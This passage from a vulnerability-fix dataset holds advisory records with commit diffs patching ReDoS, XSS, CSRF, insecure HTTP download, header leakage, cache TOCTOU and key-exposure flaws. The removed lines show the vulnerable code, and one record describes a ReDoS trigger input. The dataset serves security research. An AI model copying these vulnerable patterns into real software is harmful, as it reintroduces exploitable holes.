returns a handle to the contents of a memory mapped file which is supposed to represent a tensor.\n\nFor tensors of complex types (resources, variables and strings), allocators which are not marked as returning opaque handles will call placement new to initialize each element. This means writing to the buffer. However, in our case, the buffer is immutable and already contains the tensor data. Hence, writing to it is both destructive and causes a crash.\n\nPiperOrigin-RevId: 345786451\nChange-Id: I46369c50fa60b3431709ffe068a728d3061f49c4","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'tensorflow\/core\/kernels\/immutable_constant_op.cc': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/c1e1fc899ad5f8c725dcbb6470069890b5060bc7\/tensorflow%2Fcore%2Fkernels%2Fimmutable_constant_op.cc', 'patch': \"@@ -62,6 +62,12 @@ class MemmappedTensorAllocator : public Allocator {\\n \\n   void set_delete_on_deallocate() { delete_on_deallocate_ = true; }\\n \\n+  \/\/ Make sure tensors or complex types (strings, variants, resources) don't get\\n+  \/\/ their constructor called via a placement new since that would require\\n+  \/\/ writing to immutable data.\\n+  \/\/ See also: tensorflow\/core\/framework\/typed_allocator.h\\n+  bool AllocatesOpaqueHandle() const override { return true; }\\n+\\n  private:\\n   std::unique_ptr<ReadOnlyMemoryRegion> memory_region_;\\n   \/\/ If there is an error during allocation we keep it in this status.\"}}","message_norm":"mark `memmappedtensorallocator` as returning opaque handle.\n\nthis allocator is used for `immutableconstantop` and it returns a handle to the contents of a memory mapped file which is supposed to represent a tensor.\n\nfor tensors of complex types (resources, variables and strings), allocators which are not marked as returning opaque handles will call placement new to initialize each element. this means writing to the buffer. however, in our case, the buffer is immutable and already contains the tensor data. hence, writing to it is both destructive and causes a crash.\n\npiperorigin-revid: 345786451\nchange-id: i46369c50fa60b3431709ffe068a728d3061f49c4","language":"en","entities":"[('initialize', 'SECWORD', ''), ('345786451', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/immutable_constant_op.cc'])","num_files":1.0},{"index":2080,"vuln_id":"GHSA-hj5v-574p-mj7c","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/pytest-dev\/py\/pull\/257\/commits\/4a9017dc6199d2a564b6e4b0aa39d6d8870e4144'}","dataset":"osv","summary":"Regular expression deinal of service in py A denial of service via regular expression in the py.path.svnwc component of py (aka python-py) through 1.9.0 could be used by attackers to cause a compute-time denial of service attack by supplying malicious input to the blame functionality.","published_date":"2021-04-20","chain_len":1,"project":"https:\/\/github.com\/pytest-dev\/py","commit_href":"https:\/\/github.com\/pytest-dev\/py\/pull\/257\/commits\/4a9017dc6199d2a564b6e4b0aa39d6d8870e4144","commit_sha":"4a9017dc6199d2a564b6e4b0aa39d6d8870e4144","patch":"SINGLE","chain_ord":"['4a9017dc6199d2a564b6e4b0aa39d6d8870e4144']","before_first_fix_commit":"{'2da2caea38812eaa3ce09dd5292e3635ce9b16c8'}","last_fix_commit":"4a9017dc6199d2a564b6e4b0aa39d6d8870e4144","chain_ord_pos":1.0,"commit_datetime":"09\/04\/2020, 10:57:26","message":"svnwc: fix regular expression vulnerable to DoS in blame functionality\n\nThe subpattern `\\d+\\s*\\S+` is ambiguous which makes the pattern subject\nto catastrophic backtracing given a string like `\"1\" * 5000`.\n\nSVN blame output seems to always have at least one space between the\nrevision number and the user name, so the ambiguity can be fixed by\nchanging the `*` to `+`.\n\nFixes #256.","author":"Ran Benita","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'py\/_path\/svnwc.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pytest-dev\/py\/raw\/4a9017dc6199d2a564b6e4b0aa39d6d8870e4144\/py%2F_path%2Fsvnwc.py', 'patch': '@@ -396,7 +396,7 @@ def makecmdoptions(self):\\n     def __str__(self):\\n         return \"<SvnAuth username=%s ...>\" %(self.username,)\\n \\n-rex_blame = re.compile(r\\'\\\\s*(\\\\d+)\\\\s*(\\\\S+) (.*)\\')\\n+rex_blame = re.compile(r\\'\\\\s*(\\\\d+)\\\\s+(\\\\S+) (.*)\\')\\n \\n class SvnWCCommandPath(common.PathBase):\\n     \"\"\" path implementation offering access\/modification to svn working copies.'}}","message_norm":"svnwc: fix regular expression vulnerable to dos in blame functionality\n\nthe subpattern `\\d+\\s*\\s+` is ambiguous which makes the pattern subject\nto catastrophic backtracing given a string like `\"1\" * 5000`.\n\nsvn blame output seems to always have at least one space between the\nrevision number and the user name, so the ambiguity can be fixed by\nchanging the `*` to `+`.\n\nfixes #256.","language":"en","entities":"[('fix', 'ACTION', ''), ('vulnerable', 'SECWORD', ''), ('dos', 'SECWORD', ''), ('user name', 'SECWORD', ''), ('fixed', 'ACTION', ''), ('changing', 'ACTION', ''), ('fixes', 'ACTION', ''), ('#256', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['py\/_path\/svnwc.py'])","num_files":1.0},{"index":2082,"vuln_id":"GHSA-hj8g-cw8x-2c6m","cwe_id":"{'CWE-79'}","score":7.6,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/a5925f74d39775771d4c37c8d4c1acbb762fda0a'}","dataset":"osv","summary":"Cross-site Scripting in Microweber Microweber prior to version 1.3 is vulnerable to reflected cross-site scripting.","published_date":"2022-02-24","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/a5925f74d39775771d4c37c8d4c1acbb762fda0a","commit_sha":"a5925f74d39775771d4c37c8d4c1acbb762fda0a","patch":"SINGLE","chain_ord":"['a5925f74d39775771d4c37c8d4c1acbb762fda0a']","before_first_fix_commit":"{'0b6b1eb5ba85ffc8f74e6f5f5be9dc9f9f7e9d8f'}","last_fix_commit":"a5925f74d39775771d4c37c8d4c1acbb762fda0a","chain_ord_pos":1.0,"commit_datetime":"02\/22\/2022, 10:18:26","message":"Update UrlManager.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'src\/MicroweberPackages\/Helper\/UrlManager.php': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/a5925f74d39775771d4c37c8d4c1acbb762fda0a\/src%2FMicroweberPackages%2FHelper%2FUrlManager.php', 'patch': '@@ -276,7 +276,8 @@ public function string($skip_ajax = false)\\n \\n         \/\/ clear request params\\n         $cleanParam = new HTMLClean();\\n-        $u1 = $cleanParam->cleanArray($u1);\\n+        $u1 = $cleanParam->clean($u1);\\n+\\n \\n         return $u1;\\n     }'}}","message_norm":"update urlmanager.php","language":"sv","entities":null,"classification_level_1":"POORLY_DOCUMENTED","classification_level_2":"SUBMIT_CENTERED","list_files":"dict_keys(['src\/MicroweberPackages\/Helper\/UrlManager.php'])","num_files":1.0},{"index":2084,"vuln_id":"GHSA-hjgp-8ffr-hwwr","cwe_id":"{'CWE-311'}","score":0.0,"chain":"{'https:\/\/github.com\/dcodeIO\/ClosureCompiler.js\/commit\/e59848f5975e5b15279c044daf9cff8ff192bae6'}","dataset":"osv","summary":"Downloads Resources over HTTP in closurecompiler Affected versions of `closurecompiler` insecurely download an executable over an unencrypted HTTP connection. \n\nIn scenarios where an attacker has a privileged network position, it is possible to intercept the response and replace the executable with a malicious one, resulting in code execution on the system running `closurecompiler`.\n\n\n## Recommendation\n\nUpdate to version 1.6.1 or later.","published_date":"2019-02-18","chain_len":1,"project":"https:\/\/github.com\/dcodeIO\/ClosureCompiler.js","commit_href":"https:\/\/github.com\/dcodeIO\/ClosureCompiler.js\/commit\/e59848f5975e5b15279c044daf9cff8ff192bae6","commit_sha":"e59848f5975e5b15279c044daf9cff8ff192bae6","patch":"SINGLE","chain_ord":"['e59848f5975e5b15279c044daf9cff8ff192bae6']","before_first_fix_commit":"{'a896952c01f25a5317b6619723fe1ebeabaeb468', '923250af8c94154bdbc48f61230af1adf2543173'}","last_fix_commit":"e59848f5975e5b15279c044daf9cff8ff192bae6","chain_ord_pos":1.0,"commit_datetime":"11\/01\/2016, 14:20:53","message":"Merge pull request #51 from Greenek\/master\n\nUpdate link to bundled-openjdk-jre","author":"Daniel Wirtz","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'scripts\/configure.js': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/dcodeIO\/ClosureCompiler.js\/raw\/e59848f5975e5b15279c044daf9cff8ff192bae6\/scripts%2Fconfigure.js', 'patch': '@@ -48,7 +48,7 @@ function platformPostfix() {\\n }\\n \\n \/\/ Bundled JRE download url\\n-var jrePrefix = \"http:\/\/bundled-openjdk-jre.googlecode.com\/files\/OpenJDK-JRE-7u6_24-\";\\n+var jrePrefix = \"https:\/\/storage.googleapis.com\/google-code-archive-downloads\/v2\/code.google.com\/bundled-openjdk-jre\/OpenJDK-JRE-7u6_24-\";\\n var jrePostfix = \".tar.gz\";\\n var jreUrl = jrePrefix+platformPostfix()+jrePostfix;\\n \\n@@ -205,13 +205,13 @@ function download(downloadUrl, filename, callback, ondata) {\\n  * @param {function(?Error)} callback\\n  * @param {function(Object)=} entryCallback\\n  *\/\\n-function unpack(filename, callback, entryCallback) {   \\n+function unpack(filename, callback, entryCallback) {\\n     var input = fs.createReadStream(filename, { flags: \\'r\\', encoding: null }),\\n         files = {},\\n         dir = path.dirname(filename),\\n         returned = false,\\n         to = null;\\n-    \\n+\\n     \/\/ Finishs the unpack if all files are done\\n     function maybeFinish() {\\n         if (to !== null) clearTimeout(to);\\n@@ -230,7 +230,7 @@ function unpack(filename, callback, entryCallback) {\\n             }\\n         }, 1000);\\n     }\\n-    \\n+\\n     input.pipe(zlib.createGunzip()).pipe(tar.Parse()).on(\"entry\", function(entry) {\\n         if (entryCallback) entryCallback(entry);\\n         if (entry[\"type\"] == \\'File\\') {'}}","message_norm":"merge pull request #51 from greenek\/master\n\nupdate link to bundled-openjdk-jre","language":"no","entities":"[('#51', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['scripts\/configure.js'])","num_files":1.0},{"index":2085,"vuln_id":"GHSA-hjhp-hwfj-hwf3","cwe_id":"{'CWE-352'}","score":4.3,"chain":"{'https:\/\/github.com\/firefly-iii\/firefly-iii\/commit\/03a1601bf343181df9f405dd2109aec483cb7053'}","dataset":"osv","summary":"Cross Site Request Forgery in firefly-iii  firefly-iii is vulnerable to a Cross-Site Request Forgery (CSRF) attack which can disable two factor authentication for the target user.","published_date":"2021-12-10","chain_len":1,"project":"https:\/\/github.com\/firefly-iii\/firefly-iii","commit_href":"https:\/\/github.com\/firefly-iii\/firefly-iii\/commit\/03a1601bf343181df9f405dd2109aec483cb7053","commit_sha":"03a1601bf343181df9f405dd2109aec483cb7053","patch":"SINGLE","chain_ord":"['03a1601bf343181df9f405dd2109aec483cb7053']","before_first_fix_commit":"{'edfff4ec57133bc78bbe6bdc4e1939b75bf9d845'}","last_fix_commit":"03a1601bf343181df9f405dd2109aec483cb7053","chain_ord_pos":1.0,"commit_datetime":"11\/24\/2021, 19:04:39","message":"Fix.","author":"James Cole","comments":null,"stats":"{'additions': 5, 'deletions': 4, 'total': 9}","files":"{'resources\/views\/v1\/profile\/index.twig': {'additions': 5, 'deletions': 4, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/firefly-iii\/firefly-iii\/raw\/03a1601bf343181df9f405dd2109aec483cb7053\/resources%2Fviews%2Fv1%2Fprofile%2Findex.twig', 'patch': '@@ -107,7 +107,7 @@\\n                     <div class=\"box box-default\">\\n                         <div class=\"box-body\">\\n                             <p class=\"text-info\">{{ \\'pref_two_factor_auth_help\\'|_ }}<\/p>\\n-                            {% if enabled2FA == false %}\\n+                            {% if enabled2FA == true %}\\n                                 <p class=\"text-info\">\\n                                     {{ trans_choice(\\'firefly.pref_two_factor_backup_code_count\\', mfaBackupCount) }}\\n                                 <\/p>\\n@@ -116,10 +116,11 @@\\n                                     <a class=\"btn btn-info\" href=\"{{ route(\\'profile.code\\') }}\">\\n                                         <span class=\"fa fa-recycle\"><\/span>\\n                                         {{ \\'pref_two_factor_auth_reset_code\\'|_ }}<\/a>\\n-                                    <a class=\"btn btn-danger\" href=\"{{ route(\\'profile.delete-code\\') }}\">\\n-                                        <span class=\"fa fa-trash\"><\/span>\\n-                                        {{ \\'pref_two_factor_auth_disable_2fa\\'|_ }}<\/a>\\n                                 <\/div>\\n+                                <form method=\"post\" action=\"{{ route(\\'profile.delete-code\\') }}\">\\n+                                    <input type=\"hidden\" name=\"_token\" value=\"{{ csrf_token() }}\" \/>\\n+                                    <input class=\"btn btn-danger\" style=\"margin-top:20px;\" type=\"submit\" name=\"submit\" value=\"{{ \\'pref_two_factor_auth_disable_2fa\\'|_ }}\" \/>\\n+                                <\/form>\\n                                 <form method=\"post\" action=\"{{ route(\\'profile.new-backup-codes\\') }}\">\\n                                     <input type=\"hidden\" name=\"_token\" value=\"{{ csrf_token() }}\" \/>\\n                                     <input class=\"btn btn-default\" style=\"margin-top:20px;\" type=\"submit\" name=\"submit\" value=\"{{ \\'pref_two_factor_new_backup_codes\\'|_ }}\" \/>'}}","message_norm":"fix.","language":"ca","entities":null,"classification_level_1":"POORLY_DOCUMENTED","classification_level_2":"SINGLE_WORD","list_files":"dict_keys(['resources\/views\/v1\/profile\/index.twig'])","num_files":1.0},{"index":2087,"vuln_id":"GHSA-hjp8-2cm3-cc45","cwe_id":"{'CWE-200'}","score":7.5,"chain":"{'https:\/\/github.com\/fgribreau\/node-request-retry\/commit\/0979c6001d9d57c2aac3157c11b007397158922a'}","dataset":"osv","summary":"Cookie exposure in requestretry Exposure of Sensitive Information to an Unauthorized Actor in GitHub repository fgribreau\/node-request-retry prior to 7.0.0 via cookies being leaked to external sites.","published_date":"2022-02-24","chain_len":1,"project":"https:\/\/github.com\/fgribreau\/node-request-retry","commit_href":"https:\/\/github.com\/fgribreau\/node-request-retry\/commit\/0979c6001d9d57c2aac3157c11b007397158922a","commit_sha":"0979c6001d9d57c2aac3157c11b007397158922a","patch":"SINGLE","chain_ord":"['0979c6001d9d57c2aac3157c11b007397158922a']","before_first_fix_commit":"{'5e1a63c13c9b65ed927e8eb797d8cc7da0dae243'}","last_fix_commit":"0979c6001d9d57c2aac3157c11b007397158922a","chain_ord_pos":1.0,"commit_datetime":"02\/15\/2022, 20:20:12","message":"Prevent Cookie & Authorization Headers from being forwarded when the URL redirects to another domain (information leak) #137","author":"Timothee Desurmont","comments":null,"stats":"{'additions': 39, 'deletions': 1, 'total': 40}","files":"{'index.js': {'additions': 39, 'deletions': 1, 'changes': 40, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/FGRibreau\/node-request-retry\/raw\/0979c6001d9d57c2aac3157c11b007397158922a\/index.js', 'patch': '@@ -11,6 +11,8 @@ var extend = require(\\'extend\\');\\n var request = require(\\'request\\');\\n var RetryStrategies = require(\\'.\/strategies\\');\\n var _ = require(\\'lodash\\');\\n+var url = require(\\'url\\');\\n+var querystring = require(\"querystring\");\\n \\n var DEFAULTS = {\\n   maxAttempts: 5, \/\/ try 5 times\\n@@ -24,6 +26,42 @@ function defaultPromiseFactory(resolver) {\\n   return new Promise(resolver);\\n }\\n \\n+\/\/ Prevent Cookie & Authorization Headers from being forwarded \\n+\/\/ when the URL redirects to another domain (information leak) #137 \\n+function sanitizeHeaders(options) {\\n+  \\n+  const HEADERS_TO_IGNORE = [\"cookie\", \"authorization\"];\\n+\\n+  const urlObject = url.parse(options.url)\\n+  const queryObject = querystring.parse(urlObject.query);\\n+  \\n+  const hasExternalLink = Object.keys(queryObject).reduce(function(acc, cur) {\\n+    \\n+    let qUrl = url.parse(queryObject[cur]);\\n+\\n+    \/\/ external link if protocol || host || port is different\\n+    if(!!qUrl.host && (qUrl.protocol !== urlObject.protocol || qUrl.host !== urlObject.host || qUrl.port !== urlObject.port) ) {\\n+      acc = true;\\n+    }\\n+    \\n+    return acc;\\n+\\n+  }, false);\\n+\\n+  if (hasExternalLink && options.hasOwnProperty(\"headers\") && typeof(options.headers) === \"object\") {\\n+    \\n+    \/\/ if External Link: remove Cookie and Authorization from Headers\\n+    Object.keys(options.headers).filter(function(key) {\\n+      return HEADERS_TO_IGNORE.includes(key.toLowerCase())\\n+    }).map(function(key) {\\n+      return delete options.headers[key]\\n+    });\\n+\\n+  }\\n+\\n+  return options;\\n+}\\n+\\n function _cloneOptions(options) {\\n   const cloned = {};\\n   for (let key in options) {\\n@@ -85,7 +123,7 @@ function Request(url, options, f, retryConfig) {\\n    * Option object\\n    * @type {Object}\\n    *\/\\n-  this.options = options;\\n+  this.options = sanitizeHeaders(options);\\n \\n   \/**\\n    * Return true if the request should be retried'}}","message_norm":"prevent cookie & authorization headers from being forwarded when the url redirects to another domain (information leak) #137","language":"en","entities":"[('prevent', 'ACTION', ''), ('cookie', 'SECWORD', ''), ('information leak', 'SECWORD', ''), ('#137', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":2088,"vuln_id":"GHSA-hjxc-462x-x77j","cwe_id":"{'CWE-367'}","score":5.9,"chain":"{'https:\/\/github.com\/yarnpkg\/yarn\/commit\/0474b8c66a8ea298f5e4dedc67b2de464297ad1c'}","dataset":"osv","summary":"TOCTOU Race Condition in Yarn The package integrity validation in yarn &lt; 1.19.0 contains a TOCTOU vulnerability where the hash is computed before writing a package to cache. It&#39;s not computed again when reading from the cache. This may lead to a cache pollution attack. This issue is fixed in 1.19.0.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/yarnpkg\/yarn","commit_href":"https:\/\/github.com\/yarnpkg\/yarn\/commit\/0474b8c66a8ea298f5e4dedc67b2de464297ad1c","commit_sha":"0474b8c66a8ea298f5e4dedc67b2de464297ad1c","patch":"SINGLE","chain_ord":"['0474b8c66a8ea298f5e4dedc67b2de464297ad1c']","before_first_fix_commit":"{'7f606ec3a31b53873056d48840e8acc647dca879'}","last_fix_commit":"0474b8c66a8ea298f5e4dedc67b2de464297ad1c","chain_ord_pos":1.0,"commit_datetime":"09\/28\/2019, 12:16:15","message":"Prevents loading the cache if the stored integrity doesnt match","author":"Ma\u00ebl Nison","comments":null,"stats":"{'additions': 12, 'deletions': 3, 'total': 15}","files":"{'src\/package-fetcher.js': {'additions': 12, 'deletions': 3, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/yarnpkg\/yarn\/raw\/0474b8c66a8ea298f5e4dedc67b2de464297ad1c\/src%2Fpackage-fetcher.js', 'patch': \"@@ -9,8 +9,17 @@ import * as fetchers from '.\/fetchers\/index.js';\\n import * as fs from '.\/util\/fs.js';\\n import * as promise from '.\/util\/promise.js';\\n \\n-async function fetchCache(dest: string, fetcher: Fetchers, config: Config): Promise<FetchedMetadata> {\\n-  const {hash, package: pkg} = await config.readPackageMetadata(dest);\\n+const ssri = require('ssri');\\n+\\n+async function fetchCache(dest: string, fetcher: Fetchers, config: Config, integrity: ?string): Promise<FetchedMetadata> {\\n+  const {hash, package: pkg, remote} = await config.readPackageMetadata(dest);\\n+\\n+  if (integrity) {\\n+    if (!remote.integrity || !ssri.parse(integrity).match(remote.integrity)) {\\n+      throw new MessageError('Incorrect integrity when fetching from the cache');\\n+    }\\n+  }\\n+\\n   await fetcher.setupMirrorFromCache();\\n   return {\\n     package: pkg,\\n@@ -40,7 +49,7 @@ export async function fetchOneRemote(\\n \\n   const fetcher = new Fetcher(dest, remote, config);\\n   if (await config.isValidModuleDest(dest)) {\\n-    return fetchCache(dest, fetcher, config);\\n+      return fetchCache(dest, fetcher, config, remote.integrity);\\n   }\\n \\n   \/\/ remove as the module may be invalid\"}}","message_norm":"prevents loading the cache if the stored integrity doesnt match","language":"en","entities":"[('prevents', 'ACTION', ''), ('integrity', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/package-fetcher.js'])","num_files":1.0},{"index":2089,"vuln_id":"GHSA-hm37-9xh2-q499","cwe_id":"{'CWE-209'}","score":7.7,"chain":"{'https:\/\/github.com\/scottcwang\/openssh_key_parser\/commit\/d5b53b4b7e76c5b666fc657019dbf864fb04076c', 'https:\/\/github.com\/scottcwang\/openssh_key_parser\/commit\/26e0a471e9fdb23e635bc3014cf4cbd2323a08d3', 'https:\/\/github.com\/scottcwang\/openssh_key_parser\/commit\/274447f91b4037b7050ae634879b657554523b39'}","dataset":"osv","summary":"Possible leak of key's raw field if declared length is incorrect ### Impact\nIf a field of a key is shorter than it is declared to be, the parser raises an error with a message containing the raw field value. An attacker able to modify the declared length of a key's sensitive field can thus expose the raw value of that field.\n\n### Patches\nUpgrade to version 0.0.6, which no longer includes the raw field value in the error message.\n\n### Workarounds\nN\/A\n\n### References\nN\/A\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [openssh_key_parser](https:\/\/github.com\/scottcwang\/openssh_key_parser)","published_date":"2022-07-06","chain_len":3,"project":"https:\/\/github.com\/scottcwang\/openssh_key_parser","commit_href":"https:\/\/github.com\/scottcwang\/openssh_key_parser\/commit\/d5b53b4b7e76c5b666fc657019dbf864fb04076c","commit_sha":"d5b53b4b7e76c5b666fc657019dbf864fb04076c","patch":"MULTI","chain_ord":"['26e0a471e9fdb23e635bc3014cf4cbd2323a08d3', 'd5b53b4b7e76c5b666fc657019dbf864fb04076c', '274447f91b4037b7050ae634879b657554523b39']","before_first_fix_commit":"{'ae4d131d1cd8fe06325bfd6b749305aca60873bf', '69fe5b7addc21d3f39626ae93c6961811aea9d4c'}","last_fix_commit":"274447f91b4037b7050ae634879b657554523b39","chain_ord_pos":2.0,"commit_datetime":"06\/22\/2022, 14:59:49","message":"Improved error handling to prevent unhandled exceptions in calling code.","author":"Michael Doyle","comments":null,"stats":"{'additions': 95, 'deletions': 86, 'total': 181}","files":"{'openssh_key\/private_key_list.py': {'additions': 95, 'deletions': 86, 'changes': 181, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/scottcwang\/openssh_key_parser\/raw\/d5b53b4b7e76c5b666fc657019dbf864fb04076c\/openssh_key%2Fprivate_key_list.py', 'patch': '@@ -221,118 +221,127 @@ def from_bytes(\\n \\n         Raises:\\n             ValueError: The provided byte string is not an ``openssh-key-v1``\\n-                key list or the declared key count is negative.\\n+                key list, when the declared key count is negative, or when an\\n+                EOF is found while parsing the key.\\n+\\n             UserWarning: The check numbers in the decrypted private byte string\\n                 do not match (likely due to an incorrect passphrase), the key\\n                 type or parameter values of a private key do not match that of\\n                 the corresponding public key in the list, or the padding bytes\\n                 at the end of the decrypted private byte string are not as\\n                 expected.\\n         \"\"\"\\n-        byte_stream = PascalStyleByteStream(byte_string)\\n+        try:\\n+            byte_stream = PascalStyleByteStream(byte_string)\\n \\n-        header = byte_stream.read_from_format_instructions_dict(\\n-            cls.HEADER_FORMAT_INSTRUCTIONS_DICT\\n-        )\\n+            header = byte_stream.read_from_format_instructions_dict(\\n+                cls.HEADER_FORMAT_INSTRUCTIONS_DICT\\n+            )\\n+\\n+            if header[\\'auth_magic\\'] != b\\'openssh-key-v1\\\\x00\\':\\n+                raise ValueError(\\'Not an openssh-key-v1 key\\')\\n \\n-        if header[\\'auth_magic\\'] != b\\'openssh-key-v1\\\\x00\\':\\n-            raise ValueError(\\'Not an openssh-key-v1 key\\')\\n+            num_keys = header[\\'num_keys\\']\\n \\n-        num_keys = header[\\'num_keys\\']\\n+            if num_keys < 0:\\n+                raise ValueError(\\'Cannot parse negative number of keys\\')\\n \\n-        if num_keys < 0:\\n-            raise ValueError(\\'Cannot parse negative number of keys\\')\\n+            public_key_list = []\\n+            for i in range(num_keys):\\n+                public_key_bytes = byte_stream.read_from_format_instruction(\\n+                    PascalStyleFormatInstruction.BYTES\\n+                )\\n+                public_key_list.append(\\n+                    PublicKey.from_bytes(public_key_bytes)\\n+                )\\n \\n-        public_key_list = []\\n-        for i in range(num_keys):\\n-            public_key_bytes = byte_stream.read_from_format_instruction(\\n+            cipher_bytes = byte_stream.read_from_format_instruction(\\n                 PascalStyleFormatInstruction.BYTES\\n             )\\n-            public_key_list.append(\\n-                PublicKey.from_bytes(public_key_bytes)\\n-            )\\n \\n-        cipher_bytes = byte_stream.read_from_format_instruction(\\n-            PascalStyleFormatInstruction.BYTES\\n-        )\\n-\\n-        kdf_class = get_kdf_options_class(header[\\'kdf\\'])\\n-        kdf_options = kdf_class(\\n-            PascalStyleByteStream(\\n-                header[\\'kdf_options\\']\\n-            ).read_from_format_instructions_dict(\\n-                kdf_class.FORMAT_INSTRUCTIONS_DICT\\n+            kdf_class = get_kdf_options_class(header[\\'kdf\\'])\\n+            kdf_options = kdf_class(\\n+                PascalStyleByteStream(\\n+                    header[\\'kdf_options\\']\\n+                ).read_from_format_instructions_dict(\\n+                    kdf_class.FORMAT_INSTRUCTIONS_DICT\\n+                )\\n             )\\n-        )\\n \\n-        cipher_class = get_cipher_class(header[\\'cipher\\'])\\n+            cipher_class = get_cipher_class(header[\\'cipher\\'])\\n \\n-        if kdf_class == NoneKDFOptions:\\n-            passphrase = \\'\\'\\n-        elif passphrase is None:\\n-            passphrase = getpass.getpass(\\'Key passphrase: \\')\\n+            if kdf_class == NoneKDFOptions:\\n+                passphrase = \\'\\'\\n+            elif passphrase is None:\\n+                passphrase = getpass.getpass(\\'Key passphrase: \\')\\n \\n-        if issubclass(cipher_class, ConfidentialityIntegrityCipher):\\n-            cipher_bytes += byte_stream.read_fixed_bytes(\\n-                cipher_class.TAG_LENGTH\\n-            )\\n-\\n-        decipher_bytes = cipher_class.decrypt(\\n-            kdf_class(kdf_options),\\n-            passphrase,\\n-            cipher_bytes\\n-        )\\n-\\n-        decipher_byte_stream = PascalStyleByteStream(decipher_bytes)\\n+            if issubclass(cipher_class, ConfidentialityIntegrityCipher):\\n+                cipher_bytes += byte_stream.read_fixed_bytes(\\n+                    cipher_class.TAG_LENGTH\\n+                )\\n \\n-        decipher_bytes_header = \\\\\\n-            decipher_byte_stream.read_from_format_instructions_dict(\\n-                cls.DECIPHER_BYTES_HEADER_FORMAT_INSTRUCTIONS_DICT\\n+            decipher_bytes = cipher_class.decrypt(\\n+                kdf_class(kdf_options),\\n+                passphrase,\\n+                cipher_bytes\\n             )\\n \\n-        if decipher_bytes_header[\\'check_int_1\\'] \\\\\\n-                != decipher_bytes_header[\\'check_int_2\\']:\\n-            warnings.warn(\\'Cipher header check numbers do not match\\')\\n+            decipher_byte_stream = PascalStyleByteStream(decipher_bytes)\\n \\n-        initlist = []\\n-        for i in range(num_keys):\\n-            initlist.append(\\n-                PublicPrivateKeyPair(\\n-                    public_key_list[i],\\n-                    PrivateKey.from_byte_stream(decipher_byte_stream)\\n-                )\\n-            )\\n-            if initlist[i].public.header[\\'key_type\\'] \\\\\\n-                    != initlist[i].private.header[\\'key_type\\']:\\n-                warnings.warn(\\n-                    f\\'Inconsistency between private and public \\'\\n-                    f\\'key types for key {i}\\'\\n+            decipher_bytes_header = \\\\\\n+                decipher_byte_stream.read_from_format_instructions_dict(\\n+                    cls.DECIPHER_BYTES_HEADER_FORMAT_INSTRUCTIONS_DICT\\n                 )\\n-            if not all(\\n-                (\\n-                    initlist[i].public.params[k] ==\\n-                    initlist[i].private.params[k]\\n-                ) for k in (\\n-                    initlist[i].public.params.keys() &\\n-                    initlist[i].private.params.keys()\\n+\\n+            if decipher_bytes_header[\\'check_int_1\\'] \\\\\\n+                    != decipher_bytes_header[\\'check_int_2\\']:\\n+                warnings.warn(\\'Cipher header check numbers do not match\\')\\n+\\n+            initlist = []\\n+            for i in range(num_keys):\\n+                initlist.append(\\n+                    PublicPrivateKeyPair(\\n+                        public_key_list[i],\\n+                        PrivateKey.from_byte_stream(decipher_byte_stream)\\n+                    )\\n                 )\\n+                if initlist[i].public.header[\\'key_type\\'] \\\\\\n+                        != initlist[i].private.header[\\'key_type\\']:\\n+                    warnings.warn(\\n+                        f\\'Inconsistency between private and public \\'\\n+                        f\\'key types for key {i}\\'\\n+                    )\\n+                if not all(\\n+                    (\\n+                        initlist[i].public.params[k] ==\\n+                        initlist[i].private.params[k]\\n+                    ) for k in (\\n+                        initlist[i].public.params.keys() &\\n+                        initlist[i].private.params.keys()\\n+                    )\\n+                ):\\n+                    warnings.warn(\\n+                        f\\'Inconsistency between private and public \\'\\n+                        f\\'values for key {i}\\'\\n+                    )\\n+\\n+            decipher_padding = decipher_byte_stream.read()\\n+\\n+            if (\\n+                len(decipher_byte_stream.getvalue()) %\\n+                    cipher_class.BLOCK_SIZE != 0\\n+            ) or not (\\n+                bytes(\\n+                    range(1, 1 + cipher_class.BLOCK_SIZE)\\n+                ).startswith(decipher_padding)\\n             ):\\n-                warnings.warn(\\n-                    f\\'Inconsistency between private and public \\'\\n-                    f\\'values for key {i}\\'\\n-                )\\n-\\n-        decipher_padding = decipher_byte_stream.read()\\n-\\n-        if (\\n-            len(decipher_byte_stream.getvalue()) %\\n-                cipher_class.BLOCK_SIZE != 0\\n-        ) or not (\\n-            bytes(\\n-                range(1, 1 + cipher_class.BLOCK_SIZE)\\n-            ).startswith(decipher_padding)\\n-        ):\\n-            warnings.warn(\\'Incorrect padding at end of ciphertext\\')\\n+                warnings.warn(\\'Incorrect padding at end of ciphertext\\')\\n+        except ValueError as e:\\n+            raise e\\n+        except EOFError as e:\\n+            raise ValueError(\\'Premature EOF detected while parsing key.\\')\\n+        except e:\\n+            raise ValueError(\\'Unexpected error condition reached.\\')\\n \\n         return cls(\\n             